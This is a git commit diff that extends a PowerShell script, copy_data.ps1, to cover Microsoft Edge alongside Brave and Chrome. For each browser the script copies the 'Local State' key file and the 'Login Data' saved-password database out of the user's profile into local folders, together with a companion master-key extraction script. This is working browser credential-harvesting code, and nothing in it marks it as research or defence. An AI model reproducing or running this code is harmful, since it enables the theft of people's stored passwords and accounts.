a8934eaa12dfcdaf1288895e4efb8f5d831337b5
Sushil Shrestha <sushilshrestha940@gmail.com>
2024-08-30 15:03:49 +0545

    updated copy_data.ps1

--- copy_data.ps1
+++ copy_data.ps1
@@ -5,6 +5,7 @@ $username = [Environment]::UserName
 $ScriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path
 $destination1 = Join-Path $ScriptPath "Brave"
 $destination2 = Join-Path $ScriptPath "Chrome"
+$destination3 = Join-Path $ScriptPath "Edge"
 
 # Define source paths
 $source = Join-Path $ScriptPath extract_master_key.ps1
@@ -12,6 +13,8 @@ $source1 = "C:\Users\$username\AppData\Local\BraveSoftware\Brave-Browser\User Da
 $source2 = "C:\Users\$username\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
 $source3 = "C:\Users\$username\AppData\Local\Google\Chrome\User Data\Local State"
 $source4 = "C:\Users\$username\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+$source5 = "C:\Users\$username\AppData\Local\Microsoft\Edge\User Data\Local State"
+$source6 = "C:\Users\$username\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
 
 #Create the destination folder if it doesn't exist
 if (!(Test-Path $destination1) -and (Test-Path $source1)) {
@@ -22,6 +25,10 @@ if (!(Test-Path $destination2) -and (Test-Path $source3)) {
 	New-Item -ItemType Directory -Path $destination2 -Force
 	Write-Host "$destination2 folder created successfully!"
 }
+if (!(Test-Path $destination3) -and (Test-Path $source5)) {
+	New-Item -ItemType Directory -Path $destination3 -Force
+	Write-Host "$destination3 folder created successfully!"
+}
 
 # Copy files with error handling
 if (Test-Path $destination1) {
@@ -30,6 +37,10 @@ if (Test-Path $destination1) {
 }
 if (Test-Path $destination2) {
 	Copy-Item $source $destination2 -Force
+	Write-Host "$source copied successfully!"
+}
+if (Test-Path $destination3) {
+	Copy-Item $source $destination3 -Force
 	Write-Host "$source copied successfully!"
 }
 if (Test-Path $source1) {
@@ -55,4 +66,16 @@ if (Test-Path $source4) {
 	Write-Host "$source4 copied successfully!"
 } else {
 	Write-Warning "$source4 does not exist."
+}
+if (Test-Path $source5) {
+	Copy-Item $source5 $destination3 -Force
+	Write-Host "$source5 copied successfully!"
+} else {
+	Write-Warning "$source5 does not exist."
+}
+if (Test-Path $source6) {
+	Copy-Item $source6 $destination3 -Force
+	Write-Host "$source6 copied successfully!"
+} else {
+	Write-Warning "$source6 does not exist."
 }
